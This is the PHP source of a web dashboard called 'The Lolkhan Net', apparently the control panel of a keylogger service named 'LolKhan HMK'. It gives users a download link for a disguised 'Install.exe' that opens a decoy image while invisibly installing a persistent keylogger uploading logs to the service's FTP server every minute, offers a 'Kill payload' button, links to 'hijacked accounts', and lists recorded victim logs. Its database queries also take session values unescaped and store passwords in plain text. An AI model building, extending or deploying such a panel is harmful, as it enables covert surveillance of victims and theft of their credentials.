<?php
session_start();
require('connect.php');
require('Mobile_Detect.php');
$boolean = false;
$error = false;
$blocked = false;
$user_logged_name = null;
$user_logged_pass = null;

	if(isset($_SESSION['name']) && isset($_SESSION['pass'])){
		$name = $_SESSION['name'];
		$password = $_SESSION['pass'];
		$query_login = mysqli_query($con, "SELECT * FROM users WHERE name='$name' AND pass='$password'");
		if(mysqli_num_rows($query_login) == 0){
			unset($_SESSION['name']);
			unset($_SESSION['pass']);
		}else{
			$boolean = true;
			$user_logged_name = $_SESSION['name'];
			$user_logged_pass = $_SESSION['pass'];
			$query = mysqli_query($con, "SELECT * FROM website WHERE chawara='$user_logged_name'");
			$result = mysqli_fetch_array($query);
			
			$query = mysqli_query($con, "SELECT * FROM users WHERE name='$user_logged_name'");
			$userinfo = mysqli_fetch_array($query);

		}
	}


if(isset($_GET['kill'])){
$usernamee = $userinfo['name'];
$query = mysqli_query($con, "UPDATE hmk SET killl=1 WHERE forr='$usernamee'");
echo mysqli_error($con);
}
?>

<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		 <meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>The Lolkhan Net</title>
		<link rel="stylesheet" href="dist/css/bootstrap.css" type="text/css" />
		<link rel="stylesheet" href="dist/css/bootstrap-theme.css" type="text/css" />
		<link rel="stylesheet" href="dist/css/custom.css" type="text/css" />
		<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
		<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,700' rel='stylesheet' type='text/css'>
		<script src="/js/bootstrap.min.js"></script>
		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
		
		<style>


#breadcrumbs {
	color: #6699FF;
	font-family: Arial, Helvetica, sans-serif;
	font-size:small;
	margin: 0 0 8px 8px;
}

#breadcrumbs a, #breadcrumbs a:visited, #breadcrumbs a:link, #breadcrumbs a:active {
	color: #6699FF;
	text-decoration:none;
}

#breadcrumbs a:hover {
	text-decoration:underline;
}

#listingcontainer {
	background-image:url(bg.gif);
}

#listingheader {
	color: #476BB3;
	font-weight:bold;
	font-family:Arial, Helvetica, sans-serif;
	font-size:small;
	text-align:right;
}

#listingheader a, #listingheader a:active, #listingheader a:visited, #listingheader a:link {
	text-decoration: none;
	color: #476BB3;
}

#listingheader a:hover {
	text-decoration: underline;
	color: #476BB3;
}


#headerfile {
	text-align:left;
	float: left;
	width: 320px; 
}

#headersize {
	text-align:right;
	width: 75px;
	float: left;
}

#listing {
	border: 1px solid #A7C5FF;
}

#listing a {
	display:block;
	padding: 2px 5px 2px 5px;
	font-size:small;
	color: #6285CA;
	text-decoration:none;
	text-align:right;
	
}

#listing a:hover {
	background-color:#DBE6FE;
}

#listing a img {
	float:left;
	margin-right: 4px;
}



#listing a strong {
	width: 300px;
	float:left;
	cursor:hand;
	cursor:pointer;
	text-align:left;
}

#listing a em {
	float: left;
	width: 75px;
	text-align:right;
	cursor:hand;
	cursor:pointer;
}

#listing a span {
	position: absolute;
	margin-left: -151px;
	margin-top: -2px;
}

#listing a span img {
	width: 150px;
	background-color:#CCCCCC;
	visibility: hidden;	
}

#listing a:hover span img {
	border: 1px solid #666666;
	visibility: visible;
}

#upload {
	border: 1px solid #A7C5FF;
	display:block;
	margin-top: 10px;
	font-size:small;
	color: #6285CA;
	font-family:Arial, Helvetica, sans-serif;
	text-decoration:none;
	width:568px;
	background-color: #E9F0FF;
}

#uploadtitle {
	background-color: #DBE6FE;
	padding: 2px 5px 2px 5px;
	border-bottom: 1px solid #A7C5FF;
	
}

#uploadcontent {
	padding: 2px 5px 2px 5px;
}


#copy {
	width: 600px;
	margin-left:auto;
	margin-right:auto;
	text-align:center;
	font-size:x-small;
	color: #666666;
	font-family:Arial, Helvetica, sans-serif;
}

#copy a {
	text-decoration: underline;
	color: #666666;
}

.b {
	background-color: #E9F0FF;
	
}

.w {
	background-color:#FFFFFF;
}

.mod {
	float:right;
}

.size {
	float:right;
}

.style3 {
	color: #FF0000;
	font-weight: bold;
}

		</style>
	</head>
<body>
<?php
$detect = new Mobile_Detect;
?>
	<center class="head"  <?php if($detect->isMobile()){ ?> style="padding: 5px;"  <?php } ?>>
             <?php if($detect->isMobile()){ ?>
                     <img src="https://mylulzz.files.wordpress.com/2013/12/aca.png" style="width: 40%;">
              <?php }else{ ?>
                   <img src="https://mylulzz.files.wordpress.com/2013/12/aca.png" style="width: 10%;">
              <?php } ?>
	</center>
  
  <div class="content"></div>
   <?php if($detect->isMobile()){  }else{ ?>
  <center><h3 class="banner">The Lolkhan Net</h3></center>
<?php } ?>
	<br>


		<div class="col-md-7" style="float: none; margin: 0 auto;">
<div class="customWell" style="margin: 	15px;">
	<div class="row">
<div class="col-md-5">
<img src=" <?php echo $userinfo['profile']; ?>" style="width: 20%; display: inline-block;" class="img-thumbnail">
<p style="display: inline-block;"><b>Logged: <?php echo $userinfo['name']; ?></b></p>
</div>
</div>
</div>
<div class="customWell" style="margin: 15px; margin-top: 4px;">
			ACTIONS: <a href="logout.php">[LOGOUT]</a> <b> |</b> <a href="index.php">[SEE HIJACKED ACCOUNTS]</a>
		</div>

		<?php
		$name = $userinfo['name'];
$hashmk = false;
$iskilled = false;
	$query = mysqli_query($con, "SELECT * FROM hmk WHERE forr='$name'");
	if(mysqli_num_rows($query) != 0){
			$hashmk = true;
			$hmkk = mysqli_fetch_array($query);
if($hmkk['killl'] == 1){
$iskilled = true;
}
		$download = $hmkk['link'];
		$linknonuser = "http://lolkhanet.mzzhost.com/hmk/" . $userinfo['name'];
		
	}
	?>
<div class="customWell " style="margin: 15px;">
<legend>LolKhan HMK</legend>
<?php if($hashmk == true && $iskilled == false){ ?>
<a class="btn btn-primary" style="margin: 5px;" href="<?php echo $download; ?>">Copy link</a>
<a href="hmk.php?kill=true" class="btn btn-danger">Kill payload</a>
<a class="btn btn-primary" style="margin: 5px;" href="<?php echo $linknonuser; ?>">View data (non-site users)</a>
<p style="margin-top: 5px; line-height: 23px;">When someone clicks "Install.exe" (download link can be found from the copy link button), the file "Untitled.png" will be opened and hmk will be invisibly installed. It will start launching together with Windows in the invisible mode. Each 1 minute it will upload logs to your account folder on the FTP server of lolkhanet. The password "khan" is used to protect the Hidden Mode, logs, keylogger settings, to close the program. To disable/enable the hmk virus, the "Ctrl + Alt + Shift + H" key combination is used. <b>In Windows 7 or 8 make sure you open the file as an administrator by right clicking it and then click on 'run as administrator' option.</b> 
</p>
<?php } ?>
<?php if($hashmk == false && $iskilled == false){ ?>
<div class="alert alert-danger" role="alert"><p>You do not have HMK activated for your account.</p></div>
<?php } ?>

<?php if($iskilled == true && $hashmk == true){  ?>
<div class="alert alert-danger" role="alert"><p>You have killed your hmk. Please reactivate it in order to use it.</p></div>
<?php } ?>
  <?
$host = "lolkhanet.mzzhost.com/hmk/khan/";
$startdir = '.';
$showthumbnails = false; 
$showdirs = true;
$forcedownloads = false;
$hide = array(
				'dlf',
				'public_html',				
				'index.php',
				'Thumbs',
				'.htaccess',
				'.htpasswd'
			);
$displayindex = false;
$allowuploads = false;
$overwrite = false;

$indexfiles = array (
				'index.html',
				'index.htm',
				'default.htm',
				'default.html'
			);
			
$filetypes = array (
				'png' => 'jpg.gif',
				'jpeg' => 'jpg.gif',
				'bmp' => 'jpg.gif',
				'jpg' => 'jpg.gif', 
				'gif' => 'gif.gif',
				'zip' => 'archive.png',
				'rar' => 'archive.png',
				'exe' => 'exe.gif',
				'setup' => 'setup.gif',
				'txt' => 'text.png',
				'htm' => 'html.gif',
				'html' => 'html.gif',
				'php' => 'php.gif',				
				'fla' => 'fla.gif',
				'swf' => 'swf.gif',
				'xls' => 'xls.gif',
				'doc' => 'doc.gif',
				'sig' => 'sig.gif',
				'fh10' => 'fh10.gif',
				'pdf' => 'pdf.gif',
				'psd' => 'psd.gif',
				'rm' => 'real.gif',
				'mpg' => 'video.gif',
				'mpeg' => 'video.gif',
				'mov' => 'video2.gif',
				'avi' => 'video.gif',
				'eps' => 'eps.gif',
				'gz' => 'archive.png',
				'asc' => 'sig.gif',
			);
			
error_reporting(0);
if(!function_exists('imagecreatetruecolor')) $showthumbnails = false;
$leadon = $startdir;
$lol = $userinfo['name'];
$leadon = "hmk" . "/" . $lol;
if($leadon=='.') $leadon = '';
if((substr($leadon, -1, 1)!='/') && $leadon!='') $leadon = $leadon . '/';
$startdir = $leadon;

if($_GET['dir']) {
	//check this is okay.
	
	if(substr($_GET['dir'], -1, 1)!='/') {
		$_GET['dir'] = $_GET['dir'] . '/';
	}
	
	$dirok = true;
	$dirnames = split('/', $_GET['dir']);
	for($di=0; $di<sizeof($dirnames); $di++) {
		
		if($di<(sizeof($dirnames)-2)) {
			$dotdotdir = $dotdotdir . $dirnames[$di] . '/';
		}
		
		if($dirnames[$di] == '..') {
			$dirok = false;
		}
	}
	
	if(substr($_GET['dir'], 0, 1)=='/') {
		$dirok = false;
	}
	
	if($dirok) {
		 $leadon = $leadon . $_GET['dir'];
	}
}



$opendir = $leadon;
if(!$leadon) $opendir = '.';
if(!file_exists($opendir)) {
	$opendir = '.';
	$leadon = $startdir;
}

clearstatcache();
if ($handle = opendir($opendir)) {
	while (false !== ($file = readdir($handle))) { 
		//first see if this file is required in the listing
		if ($file == "." || $file == "..")  continue;
		$discard = false;
		for($hi=0;$hi<sizeof($hide);$hi++) {
			if(strpos($file, $hide[$hi])!==false) {
				$discard = true;
			}
		}
		
		if($discard) continue;
		if (@filetype($leadon.$file) == "dir") {
			if(!$showdirs) continue;
		
			$n++;
			if($_GET['sort']=="date") {
				$key = @filemtime($leadon.$file) . ".$n";
			}
			else {
				$key = $n;
			}
			$dirs[$key] = $file . "/";
		}
		else {
			$n++;
			if($_GET['sort']=="date") {
				$key = @filemtime($leadon.$file) . ".$n";
			}
			elseif($_GET['sort']=="size") {
				$key = @filesize($leadon.$file) . ".$n";
			}
			else {
				$key = $n;
			}
			$files[$key] = $file;
			
			if($displayindex) {
				if(in_array(strtolower($file), $indexfiles)) {
					header("Location: $file");
					die();
				}
			}
		}
	}
	closedir($handle); 
}

//sort our files
if($_GET['sort']=="date") {
	@ksort($dirs, SORT_NUMERIC);
	@ksort($files, SORT_NUMERIC);
}
elseif($_GET['sort']=="size") {
	@natcasesort($dirs); 
	@ksort($files, SORT_NUMERIC);
}
else {
	@natcasesort($dirs); 
	@natcasesort($files);
}

//order correctly
if($_GET['order']=="desc" && $_GET['sort']!="size") {$dirs = @array_reverse($dirs);}
if($_GET['order']=="desc") {$files = @array_reverse($files);}
$dirs = @array_values($dirs); $files = @array_values($files);


?>
<?php
	if($hashmk == true && $iskilled == false){
?>
<legend style="margin-top: 20px; margin-bottom: 5px;">Recorded history</legend>

  <div id="listingcontainer">
    <div id="listingheader"> 
	<div id="headerfile">File</div>
	<div id="headersize">Size</div>
	<div id="headermodified">Last Modified</div>
	</div>
    <div id="listing">
	<?
	$class = 'b';
	if($dirok) {
	?>
	<div><a href="<?=$dotdotdir;?>" class="<?=$class;?>"><img src="http://www.000webhost.com/images/index/dirup.png" alt="Folder" /><strong>..</strong> <em>-</em> <?=date ("M d Y h:i:s A", filemtime($dotdotdir));?></a></div>
	<?
		if($class=='b') $class='w';
		else $class = 'b';
	}
	$arsize = sizeof($dirs);
	for($i=0;$i<$arsize;$i++) {
	?>
	<div><a href="<?=$leadon.$dirs[$i];?>" class="<?=$class;?>"><img src="http://www.000webhost.com/images/index/folder.png" alt="<?=$dirs[$i];?>" /><strong><?=$dirs[$i];?></strong> <em>-</em> <?=date ("M d Y h:i:s A", filemtime($leadon.$dirs[$i]));?></a></div>
	<?
		if($class=='b') $class='w';
		else $class = 'b';	
	}
	
	$arsize = sizeof($files);
	for($i=0;$i<$arsize;$i++) {
		$icon = 'unknown.png';
		$ext = strtolower(substr($files[$i], strrpos($files[$i], '.')+1));
		$supportedimages = array('gif', 'png', 'jpeg', 'jpg');
		$thumb = '';
				
		if($filetypes[$ext]) {
			$icon = $filetypes[$ext];
		}
		
		$filename = $files[$i];
		if(strlen($filename)>43) {
			$filename = substr($files[$i], 0, 40) . '...';
		}
		
		$fileurl = $leadon . $files[$i];
	?>
	<div><a href="<?=$fileurl;?>" class="<?=$class;?>"<?=$thumb2;?>><img src="http://www.000webhost.com/images/index/<?=$icon;?>" alt="<?=$files[$i];?>" /><strong><?=$filename;?></strong> <em><?=round(filesize($leadon.$files[$i])/1024);?>KB</em> <?=date ("M d Y h:i:s A", filemtime($leadon.$files[$i]));?><?=$thumb;?></a></div>
	<?
		if($class=='b') $class='w';
		else $class = 'b';	
	}	
	?></div>
  </div>
  
	<?php } ?>
</div>
</body>
</html>

</div>	</div>
<br>
</div>
</div>
</body>
</html>					